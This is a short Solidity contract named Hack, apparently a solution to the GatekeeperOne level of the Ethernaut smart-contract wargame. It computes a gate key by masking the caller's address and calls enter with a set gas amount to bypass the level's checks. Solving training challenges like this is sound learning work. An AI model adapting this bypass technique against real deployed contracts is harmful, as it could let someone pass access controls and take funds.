/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external  returns (bool)  ;
}

contract Hack {
    event Log(uint160 indexed b1, uint64 indexed b2, bytes8 indexed b);
    event Log(string indexed);
    GatekeeperOne gk;
    
    function SetGK(address addr) external {
         
        gk = GatekeeperOne(addr);
        bytes8 key = bytes8(uint64(uint160(address(msg.sender))) & 0xFFFFFFFFFFFF00FF);
        try gk.enter{gas:8191}(key) {

        }catch Error(string memory err) {
            emit Log(err);
        }
        emit Log(uint160(address(msg.sender)), uint64(uint160(address(msg.sender))), key);
    }
}